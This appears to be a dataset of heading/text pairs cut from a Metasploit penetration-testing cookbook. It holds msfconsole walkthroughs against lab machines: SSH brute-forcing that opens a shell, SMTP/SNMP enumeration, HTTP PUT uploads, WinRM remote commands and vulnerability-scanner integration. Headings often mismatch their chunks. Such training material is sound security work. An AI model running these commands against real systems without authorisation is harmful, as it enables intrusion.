    "output": "Information Gathering and Scanning Chapter 2\nmsf auxiliary(ssh_login) > set STOP_ON_SUCCESS true\nSTOP_ON_SUCCESS => true\nmsf auxiliary(ssh_login) > set THREADS 256\nTHREADS => 256\nmsf auxiliary(ssh_login) > run\n[*] Scanned 1 of 2 hosts (50% complete)\n[+] 192.168.216.129:22 - Success: 'user:user' 'uid=1001(user)\ngid=1001(user) groups=1001(user) Linux metasploitable 2.6.24-16-\nserver #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '\n[*] Command shell session 1 opened (192.168.216.5:39227 ->\n192.168.216.129:22) at 2017-10-21 06:11:14 -0400\n[*] Scanned 2 of 2 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(ssh_login) >\nLooking at the output, we got lucky and got a session with the credentials\nuser:user on the Metasploitable 2 target machine.\n3. To interact with the new session, use the sessions command with the -i option\nto interact with the session and supply the session ID, in this case 1:\nmsf auxiliary(ssh_login) > sessions -i 1\n[*] Starting interaction with 1...\nhostname\nmetasploitable\nid\nuid=1001(user) gid=1001(user) groups=1001(user)\nFTP scanning\nIn this recipe, we will do a version scan for all open FTP servers in a network,\nusing Metasploit.\nGetting ready\nThe FTP Version Scanner auxiliary module allows us to detect the FTP version running.\n[ 65 ]"
  },
  {
    "input": "SMTP enumeration",
    "output": "Information Gathering and Scanning Chapter 2\nHow to do it...\n1. To scan for FTP servers on the network, use\nthe auxiliary/scanner/ftp/ftp_version auxiliary module, set the target\naddress range in RHOSTS, and the number of concurrent threads to 256:\nmsf > use auxiliary/scanner/ftp/ftp_version\nmsf auxiliary(ftp_version) > set RHOSTS 192.168.216.10,129\nRHOSTS => 192.168.216.10,129\nmsf auxiliary(ftp_version) > set THREADS 256\nTHREADS => 256\nmsf auxiliary(ftp_version) > run\n[+] 192.168.216.129:21 - FTP Banner: '220 (vsFTPd 2.3.4)\\x0d\\x0a'\n[*] Scanned 1 of 2 hosts (50% complete)\n[*] Scanned 2 of 2 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(ftp_version) >\n2. The scan results, as with the previous auxiliary modules, will get stored in the\nMetasploit database and can be accessed using the services command:\nmsf auxiliary(ftp_version) > services\nServices\n========\nhost port proto name state info\n---- ---- ----- ---- ----- ----\n192.168.216.129 21 tcp ftp open 220 (vsFTPd 2.3.4)\\x0d\\x0a\nmsf auxiliary(ftp_version) >\nSMTP enumeration\nThe Simple Mail Transfer Protocol (SMTP) service has two internal commands that allow\nthe enumeration of users: VRFY (confirming the names of valid users) and EXPN (which\nreveals the actual address of users' aliases and lists of emails (mailing lists)).\n[ 66 ]"
  },
  {
    "input": "SNMP enumeration",
    "output": "Information Gathering and Scanning Chapter 2\nGetting ready\nThe SMTP User Enumeration Utility auxiliary module, through the implementation of these\nSMTP commands, can reveal a list of valid users.\nHow to do it...\nThe SMTP User Enumeration Utility auxiliary module, by default, will use\nthe unix_users.txt file located at /usr/share/metasploit-\nframework/data/wordlists/, but you can specify your own. To run the module, set\nthe target address range, the number of concurrent threads, and type run:\nmsf > use auxiliary/scanner/smtp/smtp_enum\nmsf auxiliary(smtp_enum) > set RHOSTS 192.168.216.129\nmsf auxiliary(smtp_enum) > set THREADS 256\nTHREADS => 256\nmsf auxiliary(smtp_enum) > run\n[*] 192.168.216.129:25 - 192.168.216.129:25 Banner: 220\nmetasploitable.localdomain ESMTP Postfix (Ubuntu)\n[+] 192.168.216.129:25 - 192.168.216.129:25 Users found: , backup, bin,\ndaemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man,\nnews, nobody, postgres, postmaster, proxy, service, sshd, sync, sys,\nsyslog, user, uucp, www-data\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smtp_enum) >\nThe output reveals a list of valid users for the Metasploitable 2 target.\nSNMP enumeration\nThe Simple Network Management Protocol (SNMP) is used on networked devices to read,\nwrite, and update device configuration remotely. SNMP sweeps are often a good indicator\nin finding a lot of information about a specific system, or actually compromising the remote\ndevice. In this recipe, we will learn to use the SNMP scanning module.\n[ 67 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\nGetting ready\nMetasploit has a built-in auxiliary module specifically for sweeping SNMP devices. One\nmust understand it before performing an attack. First, read-only and read-write community\nstrings play an important role in the sort of information that can be mined or altered on the\ndevices themselves. The Management Information Base (MIB) interface allows us to query\nthe device and extract information.\nIf dealing with Windows-based devices configured with SNMP, often at\ntimes with the RO/RW community strings, we can extract patch levels,\nservices running, last reboot times, usernames on the system, routes, and\nvarious other aspects that worth hack value.\nWhen querying through SNMP, there is the MIB API. This interface allows us to query the\ndevice and extract information. Metasploit comes loaded with a list of default MIBs in its\ndatabase; they are used to query the device for more information, depending on whether\nthe bar of access is obtained.\nHow to do it...\n1. The SNMP Community Login Scanner auxiliary module logs into SNMP devices\nusing common community names:\nmsf > use auxiliary/scanner/snmp/\nmsf > use auxiliary/scanner/snmp/snmp_login\nmsf auxiliary(snmp_login) > set RHOSTS 192.168.216.10,129\nRHOSTS => 192.168.216.10,129\nmsf auxiliary(snmp_login) > run\n[+] 192.168.216.10:161 - Login Successful: public (Access level:\nread-only); Proof (sysDescr.0): Hardware: Intel64 Family 6 Model 70\nStepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.1 (Build\n7601 Multiprocessor Free)\n[*] Scanned 1 of 2 hosts (50% complete)\n[*] Scanned 2 of 2 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(snmp_login) >\n[ 68 ]"
  },
  {
    "input": "Getting ready",
    "output": "Information Gathering and Scanning Chapter 2\n2. We can gather loads of information using SNMP scanning modules, such as open\nports, services, hostnames, processes, and uptime. To achieve this, we'll run the\nauxiliary/scanner/snmp/snmp_enum auxiliary module and see what\ninformation it provides us with:\nmsf > use auxiliary/scanner/snmp/snmp_enum\nmsf auxiliary(snmp_enum) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(snmp_enum) > run\n[+] 192.168.216.10, Connected.\n[*] System information:\n...\nContact : -\nLocation : -\nUptime snmp : 14:52:25.92\nUptime system : 00:01:55.31\nSystem date : 2017-10-21 03:36:31.2\n[*] User accounts:\n...\n[\"Administrator\"]\n[\"luke_skywalker\"]\n[\"anakin_skywalker\"]\n[\"lando_calrissian\"]\n...\nHTTP scanning\nThe Hypertext Transfer Protocol (HTTP) is an application protocol that serves as the\nfoundation of data communication for the World Wide Web. Since it is used by numerous\napplications, from the Internet of Things (IoT) devices to mobile applications, it is a great\nplace to search for vulnerabilities.\nGetting ready\nThe HTTP SSL Certificate Checker auxiliary module will check the certificate of the\nspecified web servers to ensure the subject and issuer match the supplied pattern, and that\nthe certificate is not expired.\n[ 69 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\nThe HTTP Robots.txt Content Scanner auxiliary module will search for robots.txt files\nand analyze their content.\nIf the PUT method can be used by any unauthenticated remote user, arbitrary web pages can\nbe inserted into the web root, possibly leading to a deface or even remote code execution, or\nthe disk can be filled with meaningless data, resulting in a denial of service attack.\nThe Jenkins-CI Enumeration HTTP auxiliary module enumerates a remote Jenkins-CI\ninstallation without authentication, including host operating system and Jenkins installation\ndetails.\nHow to do it...\n1. To run the HTTP SSL Certificate Checker auxiliary module, we need to specify\nthe target host and the target port: in this example, 192.168.216.10 and port\n8383:\nmsf > use auxiliary/scanner/http/cert\nmsf auxiliary(cert) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(cert) > set RPORT 8383\nRPORT => 8383\nmsf auxiliary(cert) > run\n[*] 192.168.216.10:8383 - 192.168.216.10 - 'Desktop Central' :\n/C=US/ST=CA/L=Pleasanton/O=Zoho\nCorporation/OU=ManageEngine/CN=Desktop\nCentral/emailAddress=support@desktopcentral.com\n[*] 192.168.216.10:8383 - 192.168.216.10 - 'Desktop Central' :\n'2010-09-08 12:24:44 UTC' - '2020-09-05 12:24:44 UTC'\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(cert) >\n2. To run the HTTP Robots.txt Content Scanner auxiliary module, we will specify\nthe test path to find the robots.txt file and the target IP address:\nmsf > use auxiliary/scanner/http/robots_txt\nmsf auxiliary(robots_txt) > set PATH /mutillidae\nPATH => /mutillidae\nmsf auxiliary(robots_txt) > set RHOSTS 192.168.216.129\nRHOSTS => 192.168.216.129\nmsf auxiliary(robots_txt) > run\n[ 70 ]\nInformation Gathering and Scanning Chapter 2\n...\nDisallow: ./owasp-esapi-php/\nDisallow: ./documentation/\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(robots_txt) >\n3. The HTTP Writable Path PUT/DELETE File Access auxiliary module can abuse\nmisconfigured web servers to upload and delete web content via PUT and DELETE\nHTTP requests. The set action to either PUT or DELETE. PUT is the default. If a\nfilename isn't specified, the module will generate a random string for you as a\n.txt file:\nmsf > use auxiliary/scanner/http/http_put\nmsf auxiliary(http_put) > set PATH /uploads\nPATH => /uploads\nmsf auxiliary(http_put) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(http_put) > set RPORT 8585\nRPORT => 8585\nmsf auxiliary(http_put) > run\n[+] File uploaded:\nhttp://192.168.216.10:8585/uploads/msf_http_put_test.txt\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(http_put) >\n4. To run the auxiliary module, we need to specify the target address, or range, the\ntarget port, and the path to the Jenkins-CI application:\nmsf > use auxiliary/scanner/http/jenkins_enum\nmsf auxiliary(jenkins_enum) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(jenkins_enum) > set RPORT 8484\nRPORT => 8484\nmsf auxiliary(jenkins_enum) > set TARGETURI /\nTARGETURI => /\nmsf auxiliary(jenkins_enum) > run\n...\n[+] http://192.168.216.10:8484/ - /systemInfo does not require\nauthentication (200)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(jenkins_enum) >\n[ 71 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\nLooking at the output, we were able to enumerate the Jenkins version, host operating\nsystem, and installation details.\nWinRM scanning and brute forcing\nWindows Remote Management (WinRM) is the Microsoft implementation of the WS-\nManagement Protocol, a standard Simple Object Access Protocol (SOAP)-based, firewall-\nfriendly protocol that allows hardware and operating systems, from different vendors, to\ninteroperate.\nGetting ready\nThe WinRM Authentication Method Detection auxiliary module sends a request to an\nHTTP/HTTPS service to see if it is a WinRM service. If it is a WinRM service, it also gathers\nthe authentication methods supported.\nNow that we know that the target system has WinRM enabled, we can start scanning to see\nif we can leverage WinRM and compromise the system.\nUsing the credentials found with the SMB Login Check Scanner auxiliary module, we can\ntest if we can run Windows commands using the WinRM service, using the WinRM\nCommand Runner auxiliary module.\nHow to do it...\n1. To use the WinRM Authentication Method Detection auxiliary module, set the\ntarget address range in RHOSTS and type run:\nmsf > use auxiliary/scanner/winrm/winrm_auth_methods\nmsf auxiliary(winrm_auth_methods) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(winrm_auth_methods) > run\n[+] 192.168.216.10:5985: Negotiate protocol supported\n[+] 192.168.216.10:5985: Basic protocol supported\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(winrm_auth_methods) >\n[ 72 ]"
  },
  {
    "input": "Integrating with Nessus",
    "output": "Information Gathering and Scanning Chapter 2\n2. To run the WinRM Command Runner auxiliary module, we need to set the\ntargets IP address, the Windows command to run, the\nusername Administrator, and password vagrant:\nmsf > use auxiliary/scanner/winrm/winrm_cmd\nmsf auxiliary(winrm_cmd) > set CMD hostname\nCMD => hostname\nmsf auxiliary(winrm_cmd) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(winrm_cmd) > set USERNAME Administrator\nUSERNAME => Administrator\nmsf auxiliary(winrm_cmd) > set PASSWORD vagrant\nPASSWORD => vagrant\nmsf auxiliary(winrm_cmd) > run\n[+] vagrant-2008R2\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(winrm_cmd) >\nLooking at the output of the module, we can see that we can run remote commands on the\ntarget machine.\nIntegrating with Nessus\nSo far, we have learned the basics of port scanning, along with the practical implementation\nwith Nmap. Port scanning has been extended to several other tools which further enhances\nthe process of scanning and information gathering. In the next few recipes, we will cover\nthose tools which scan the target for available services and open ports and then try to\ndetermine the type of vulnerability that may exist for that particular service or port. Let's\nbegin our journey to vulnerability scanning.\nNessus is one of the most widely used vulnerability scanners. It scans the target for a range\nof vulnerabilities and produces a detailed report for it. Nessus is a very helpful tool to use\nfor penetration testing. Either you can use the GUI version of Nessus, or you can use it from\nthe Metasploit console. In this book, we will primarily focus on using Nessus with\nmsfconsole.\n[ 73 ]"
  },
  {
    "input": "Getting ready",
    "output": "Information Gathering and Scanning Chapter 2\nGetting ready\nTo use Nessus for the first time, you will have to register and get a registration code from\nthe Nessus website. To test Nessus, you can use Nessus Home, which allows you to scan\nyour personal home network (up to 16 IP addresses per scanner). You can download it\nat https:/​/​www.​tenable.​com/​products/​nessus-​home.\nTo install Nessus on Kali Linux, on the download page choose the Debian software package\nfile (.deb) for your version 32 or 64 bits, and use the dpkg -i command, followed by the\nNessus software package file:\nroot@kali:~# dpkg -i Nessus*.deb\n...\nUnpacking Nessus Core Components...\nnessusd (Nessus) 6.11.1 [build M20101] for Linux\nCopyright (C) 1998 - 2017 Tenable Network Security, Inc\nProcessing the Nessus plugins...\n[##################################################]\nAll plugins loaded (1sec)\n- You can start Nessus by typing /etc/init.d/nessusd start\n- Then go to https://kali:8834/ to configure your scanner\nProcessing triggers for systemd (235-2) ...\nroot@kali:~#\nThen, start the Nessus services, using the following command:\nroot@kali:~# systemctl start nessusd.service\nThen open your browser and go to https:/​/​kali:8834/​ to configure Nessus. To start\nworking with Nessus in msfconsole, we will have to load Nessus and then connect it with\nthe server to start our penetration testing.\n[ 74 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\nHow to do it...\n1. First, we will launch msfconsole and load the nessus plugin:\nmsf > load nessus\n[*] Nessus Bridge for Metasploit\n[*] Type nessus_help for a command listing\n[*] Successfully loaded plugin: Nessus\nmsf >\n2. By running the nessus_help command, we can display all the available\ncommands:\nmsf > nessus_help\nCommand Help Text\n------- ---------\nGeneric Commands\n----------------- -----------------\nnessus_connect Connect to a Nessus server\nnessus_logout Logout from the Nessus server\nnessus_login Login into the connected Nesssus server\nwith a different username and password\nnessus_save Save credentials of the logged in user\n...\nScan Commands\n----------------- -----------------\nnessus_scan_list List of all current Nessus scans\nnessus_scan_new Create a new Nessus Scan\nnessus_scan_launch Launch a newly created scan. New scans\nneed to be manually launched through this command\nnessus_scan_pause Pause a running Nessus scan\nnessus_scan_pause_all Pause all running Nessus scans\n...\nPolicy Commands\n----------------- -----------------\nnessus_policy_list List all polciies\nnessus_policy_del Delete a policy\nmsf >\n[ 75 ]\nInformation Gathering and Scanning Chapter 2\n3. To connect to Nessus, use the nessus_connect command with the Nessus\ncredentials, hostname, port (if not using the default port 8834), and verify the\nSSL certificate:\nmsf > nessus_connect NessusUser:NessusP4ssw0rd@127.0.0.1 ok\n[*] Connecting to https://127.0.0.1:8834/ as NessusUser\n[*] User NessusUser authenticated successfully.\nmsf >\n4. Using the nessus_policy_list command, we can list all policies on the server;\nbefore using Nessus via msfconsole, you need to connect to the Nessus GUI and\ncreate a policy before being able to use it:\nmsf > nessus_policy_list\nPolicy ID Name Policy UUID\n--------- ---- -----------\n4 Basic Network Scan 731a8e52-3ea6-a291-ec0a-\nd2ff0619c19d7bd788d6be818b65\nmsf >\n5. To create a new Nessus scan, we use the nessus_scan_new command followed\nby the UUID of the policy we want to use, the name for the scan, description, and\nthe target:\nmsf > nessus_scan_new 731a8e52-3ea6-a291-ec0a-\nd2ff0619c19d7bd788d6be818b65 Metasploitable3 \"Windows Machine\"\n192.168.216.10\n[*] Creating scan from policy number 731a8e52-3ea6-a291-ec0a-\nd2ff0619c19d7bd788d6be818b65, called Metasploitable3 - Windows\nMachine and scanning 192.168.216.10\n[*] New scan added\n[*] Use nessus_scan_launch 6 to launch the scan\nScan ID Scanner ID Policy ID Targets Owner\n------- ---------- --------- ------- -----\n9 1 8 192.168.216.10 NessusUser\nmsf >\n[ 76 ]\nInformation Gathering and Scanning Chapter 2\n6. The nessus_scan_list command returns a list of information about current\nscans:\nmsf > nessus_scan_list\nScan ID Name Owner Started Status Folder\n------- ---- ----- ------- ------ ------\n9 Metasploitable3 NessusUser empty 3\nmsf >\n7. From the output, we can see that the scan was created, but not started. To start\nthe scan, we use the nessus_scan_launch followed by the scan ID:\nmsf > nessus_scan_launch 9\n[+] Scan ID 9 successfully launched. The Scan UUID is\nf6309e8e-8ff4-2744-a9f3-40fa6b0d737793e6668aadb812c9\nmsf >\n8. By running the nessus_scan_list command, again we can see that the scan is\nrunning:\nmsf > nessus_scan_list\nScan ID Name Owner Started Status Folder\n------- ---- ----- ------- ------ ------\n9 Metasploitable3 NessusUser running 3\nmsf >\n9. The nessus_scan_details allows us to get information about the scan, such as\ninformation, hosts, vulnerabilities, and history, as shown in the following\nscreenshot:\n[ 77 ]\nInformation Gathering and Scanning Chapter 2\n10. To check if the scan has completed, use the nessus_scan_details command:\n[ 78 ]\nInformation Gathering and Scanning Chapter 2\n11. When the scan is complete, we can import scan results into Metasploit using the\nnessus_db_import command:\n12. Now that we have imported all the data into Metasploit, we can use the\nmsfconsole database commands to find services and vulnerabilities and try to\nexploit them:\nmsf > hosts\nHosts\n=====\naddress mac name os_name os_flavor os_sp purpose info comments\n------- --- ---- ------- --------- ----- ------- ---- --------\n192.168.216.10 08:00:27:2f:fe:84 192.168.216.10 Windows 2008 SP1\nserver\nmsf > services\nServices\n========\nhost port proto name state info\n---- ---- ----- ---- ----- ----\n192.168.216.10 22 tcp ssh open\n192.168.216.10 135 tcp epmap open\n192.168.216.10 137 udp netbios-ns open\n192.168.216.10 139 tcp smb open\n...\n[*] Time: 2017-10-23 09:12:50 UTC Vuln: host=192.168.216.10\nname=Service Detection refs=NSS-22964\n[ 79 ]"
  },
  {
    "input": "Getting ready",
    "output": "Information Gathering and Scanning Chapter 2\n[*] Time: 2017-10-23 09:12:50 UTC Vuln: host=192.168.216.10\nname=Nessus SYN scanner refs=NSS-11219\nIntegrating with NeXpose\nIn the previous recipe, we discussed Nessus as a potential vulnerability scanner. In this\nrecipe, we will cover another important vulnerability scanner called NeXpose.\nNeXpose is a popular tool by Rapid7, which performs the task of vulnerability scanning and\nimporting results to the Metasploit database. The usage of NeXpose is similar to Nessus,\nbut let's have a quick look at how to get started with NeXpose. I will leave the task of\nexploring it deeper as an assignment for you.\nGetting ready\nYou can download NeXpose Community from http:/​/​www.​rapid7.​com/​products/\nmetasploit/​metasploit-​community-​registration.​jsp. After installing NeXpose, you\ncan start using it the from the msfconsole, but first, we need to load the plugin to connect\nto the NeXpose server. Let's execute these steps in the command line:\nTo connect with the NeXpose server, use the nexpose_connect command followed by\nthe credentials, hostname, port, and verify the SSL certificate:\nmsf > nexpose_connect NexposeUser:NexposeP4ssw0rd@127.0.0.1:3780 ok\n[*] Connecting to Nexpose instance at 127.0.0.1:3780 with username\nNexposeUser...\nmsf >\n[ 80 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\nHow to do it...\nNow that we are connected with our server, we can scan our target and generate reports.\nThere are two scan commands supported by NeXpose. One is nexpose_scan and the other\nis nexpose_discover. The former will scan a range of IP addresses and import the results,\nwhereas the latter will scan only to discover hosts and services running on them.\n1. Let's perform a quick scan on our target using NeXpose:\nmsf > nexpose_discover 192.168.216.10\n[*] Scanning 1 addresses with template aggressive-discovery in sets\nof 32\n[*] Completed the scan of 1 addresses\nmsf >\nThe nexpose_discover command launches a scan but only performs host and\nminimal service discovery.\n2. To display the help for the nexpose_scan command, we can use the -h option:\nmsf > nexpose_scan -h\nUsage: nexpose_scan [options] <Target IP Ranges>\nOPTIONS:\n-E <opt> Exclude hosts in the specified range from the scan\n-I <opt> Only scan systems with an address within the specified\nrange\n-P Leave the scan data on the server when it completes (this\ncounts against the maximum licensed IPs)\n-c <opt> Specify credentials to use against these targets\n(format is type:user:pass\n-d Scan hosts based on the contents of the existing database\n-h This help menu\n-n <opt> The maximum number of IPs to scan at a time (default\nis 32)\n...\nmsf >\n[ 81 ]"
  },
  {
    "input": "How to do it...",
    "output": "Information Gathering and Scanning Chapter 2\n3. To scan our target, we will use the nexpose_scan command, the full-audit\nscan template:\nmsf > nexpose_scan -t full-audit 192.168.216.10\n[*] Scanning 1 addresses with template full-audit in sets of 32\n[*] Completed the scan of 1 addresses\nmsf >\n4. To import the scan results, we will use the nexpose_site_import command:\nmsf > nexpose_site_import 1\n[*] Generating the export data file...\n[*] Downloading the export data...\n[*] Importing Nexpose data...\nmsf >\nWith the scan results imported into Metasploit, we can use the msfconsole\ndatabase commands to display the hosts, services, and vulnerabilities found.\nIntegrating with OpenVAS\nThe Open Vulnerability Assessment System (OpenVAS) is the most widespread open\nsource solution for vulnerability scanning and vulnerability management.\nOpenVAS is the scan engine used and supported as part of the Greenbone Security\nSolutions. The Greenbone development team has contributed significantly to the\nenhancement of OpenVAS since 2005.\nHow to do it...\n1. To install OpenVAS on Kali Linux use the apt install openvas command:\nroot@kali:~# apt-get install openvas\n2. Then use the openvas-setup command to set up OpenVAS, download the latest\nrules, create an admin user, and start up the various services:\nroot@kali:~# openvas-setup\n[ 82 ]\nInformation Gathering and Scanning Chapter 2\n3. When the setup is finished, the OpenVAS manager, scanner, and GSAD services\nshould be listening. To start OpenVAS, use the openvas-start command:\nroot@kali:~# openvas-start\nStarting OpenVas Services\nroot@kali:~#\n4. Before we can use OpenVAS inside msfconsole, we need to load the OpenVAS\nplugin using the load command:\nmsf > load openvas\n[*] Welcome to OpenVAS integration by kost and averagesecurityguy.\n[*]\n[*] OpenVAS integration requires a database connection. Once the\n[*] database is ready, connect to the OpenVAS server using\nopenvas_connect.\n[*] For additional commands use openvas_help.\n[*]\n[*] Successfully loaded plugin: OpenVAS\nmsf >\n5. We can use the help command to display all the available OpenVAS commands\nwe can use inside msfconsole:\nmsf > help openvas\nOpenVAS Commands\n================\nCommand Description\n------- -----------\nopenvas_config_list Quickly display list of configs\nopenvas_connect Connect to an OpenVAS manager using OMP\n...\nopenvas_task_start Start task by ID\nopenvas_task_stop Stop task by ID\nopenvas_version Display the version of the OpenVAS server\nmsf >\n[ 83 ]\nInformation Gathering and Scanning Chapter 2\n6. To connect to the OpenVAS manager using OMP, we use the openvas_connect\nfollowed by the OpenVAS username, password, and the OpenVAS server IP\naddress and port:\nmsf > openvas_connect admin 596230dc-cfe0-4322-a7b7-025d11a28141\n127.0.0.1 9390\n[*] Connecting to OpenVAS instance at 127.0.0.1:9390 with username\nadmin...\n/usr/share/metasploit-\nframework/vendor/bundle/ruby/2.3.0/gems/openvas-\nomp-0.0.4/lib/openvas-omp.rb:201:in `sendrecv': Object#timeout is\ndeprecated, use Timeout.timeout instead.\n[+] OpenVAS connection successful\nmsf >\n7. After connecting to the OpenVAS server, we need to specify our target using\nthe openvas_target_create command followed by the name we want to give\nto our target, the IP address of the target, and a description or comment about the\ntarget:\nmsf > openvas_target_create \"Metasploitable3\" 192.168.216.10\n\"Windows Target\"\n[+] OpenVAS list of targets\nID Name Hosts Max Hosts In Use Comment\n-- ---- ----- --------- ------ -------\n83d3d851-150a-4d1b-80e3-04bb90d034cb Metasploitable3 192.168.216.10\n1 0 Windows Target\nmsf >\n8. The openvas_config_list displays the list of configurations we can use to\nscan the target:\nmsf > openvas_config_list\n[+] OpenVAS list of configs\nID Name\n-- ----\n085569ce-73ed-11df-83c3-002264764cea empty\n2d3f051c-55ba-11e3-bf43-406186ea4fc5 Host Discovery\n698f691e-7489-11df-9d8c-002264764cea Full and fast ultimate\n708f25c4-7489-11df-8094-002264764cea Full and very deep\n...\nmsf >\n[ 84 ]\nInformation Gathering and Scanning Chapter 2\n9. Now, we need to create a task using the openvas_task_create followed by the\ntask name, comment, the config ID, and target ID:\n10. To start the task, we will use the openvas_task_start followed by the task ID:\n11. To monitor the progress, we use the openvas_task_list command:\n[ 85 ]\nInformation Gathering and Scanning Chapter 2\n12. The openvas_format_list will display the list of report formats supported by\nOpenVAS:\n13. To see if the task has completed, use the openvas_task_list command:\n[ 86 ]\nInformation Gathering and Scanning Chapter 2\n14. When the scan is finished, we can use the openvas_report_list command to\nlist the available reports:\n15. And use the openvas_report_import command to import the report into\nMetasploit. Only the NBE (legacy OpenVAS report) and XML formats are\nsupported for importing:\n16. After importing the report into Metasploit, we can use the msfconsole database\nvulns command to list the vulnerabilities found:\n[ 87 ]"
  },
  {
    "input": "Introduction",
    "output": "3\nServer-Side Exploitation\nIn this chapter, we will cover the following recipes:\nExploiting a Linux server\nSQL injection\nTypes of shell\nExploiting a Windows Server machine\nExploiting common services\nMS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\nMS17-010 EternalRomance/EternalSynergy/EternalChampion\nInstalling backdoors\nDenial of Service\nIntroduction\nIn Chapter 2, Information Gathering and Scanning, we focused on gathering information\nabout our target, such as the target IP address, open ports, available services, operating\nsystem, and so on. One of the biggest assets in the process of information gathering is\ngaining knowledge about the operating system used by the target server or system. This\ninformation can prove to be very helpful in penetrating the target machine, as we can\nquickly look for exploits and vulnerabilities for the services running on the system. Well,\nthe process is not as straightforward as it sounds, but knowledge about the target operating\nsystem and the services it is running can ease our task to a great extent.\nServer-Side Exploitation Chapter 3\nEvery flavor of an operating system has some bug in it. Once it gets reported, the process of\ndeveloping exploits for it starts. Licensed operating systems, such as Windows, quickly\ndevelop patches for the bug or vulnerability and provide it as an update to its users.\nVulnerability disclosure is a big issue these days. Many zero-day disclosures create havoc in\nthe computer industry. Zero-day vulnerabilities are highly sought after, and on the market\nthe price may range from 15,000 USD to 1,000000 USD. Vulnerabilities are detected and\nexploited but the disclosure of vulnerability depends on the researcher and their intention.\nWell-known companies such as Microsoft, Apple and Google issue patches for their\nproducts at regular intervals, but it's up to the user to apply them. In corporate scenarios,\nthis gets even worse, it takes weeks before servers are patched because of the downtime\ninvolved and to ensure business continuity is not hampered. So, it is always recommended\nyou update or keep an eye on any latest vulnerability discovered in your operating system\nin use. Unpatched systems are a safe haven for hackers, as they immediately launch exploits\nto compromise the target. Hence, regularly patching and updating the operating system is\nessential. In this chapter, we will focus on vulnerabilities that are reported in some of the\nmost popular services and operating systems.\nIn the process of penetration testing, once the information about the target operating system\nis available, pentesters start looking for available exploits for the particular service or\noperating system flaws. So, this chapter will be the first step toward penetrating our target\nthrough vulnerabilities on the server side. We will focus on some of the most widely used\noperating systems of Microsoft, and some flavors of Linux. We will also look at how to use\nexploits and set up their parameters to make them executable on the target machine. Last,\nbut not least, we will discuss some useful payloads available to us in the Metasploit\nFramework. Let's move further on with the various recipes.\nBefore starting to use exploits and payloads on target machines, we will first have to know\nsome basics about them. It is essential to understand the usage of exploits so that you can\novercome some common errors that may arise due to misconfiguration of the parameters.\nSo, let's begin with some basics of using exploits and how to set parameter values.\nIn order to start using exploits on your target, the first thing required is to scan the target for\nopen ports and services. Once you have gathered enough information about the target, the\nnext step is to select exploits accordingly. So, let's analyze some exploit commands that can\nbe launched directly from MSFconsole.\n[ 89 ]"
  },
  {
    "input": "MSFconsole commands",
    "output": "Server-Side Exploitation Chapter 3\nGetting to know MSFconsole\nMSFconsole is the most popular interface for the Metasploit Framework, allows access to\nmost features, and is the most stable interface in Metasploit. So, let's learn a bit more\nabout MSFconsole.\nMSFconsole commands\nTo display the help menu, simply type the help command inside msfconsole:\nmsf > help\nCore Commands\n=============\nCommand Description\n------- -----------\n? Help menu\nbanner Display an awesome metasploit banner\ncd Change the current working directory\ncolor Toggle color\nconnect Communicate with a host\n...\nDatabase Backend Commands\n=========================\nCommand Description\n------- -----------\ndb_connect Connect to an existing database\ndb_disconnect Disconnect from the current database instance\ndb_export Export a file containing the contents of the\n...\nCredentials Backend Commands\n============================\nCommand Description\n------- -----------\ncreds List all credentials in the database\nmsf >\n[ 90 ]"
  },
  {
    "input": "Exploiting a Linux server",
    "output": "Server-Side Exploitation Chapter 3\nLooking at the output, it can be intimidating at first; however, we have already learned\nsome of the commands, such as the database backend commands. Now, we will focus on\ncommands that will be most helpful during the exploit phase and learn the remaining\ncommands as we go.\nProbably the most helpful command to start with is the search command:\nmsf > search -h\nUsage: search [keywords]\nKeywords:\napp : Modules that are client or server attacks\nauthor : Modules written by this author\nbid : Modules with a matching Bugtraq ID\ncve : Modules with a matching CVE ID\nedb : Modules with a matching Exploit-DB ID\nname : Modules with a matching descriptive name\nplatform : Modules affecting this platform\nref : Modules with a matching ref\ntype : Modules of a specific type (exploit, auxiliary, or post)\nExamples:\nsearch cve:2009 type:exploit app:client\nmsf >\nExploiting a Linux server\nLinux is one of the most widely used operating systems. In the previous few recipes, we\nsaw how to scan for available services and use vulnerability scanners to find vulnerabilities.\nIn this recipe, we will deal with Linux operating systems. We will be using the\nMetasploitable 2, for our vulnerable Linux machine in this recipe, but the process will be\nsimilar for exploiting any flavor of Linux and Solaris running the Samba service. Let's move\nahead with the recipe.\n[ 91 ]"
  },
  {
    "input": "Getting ready",
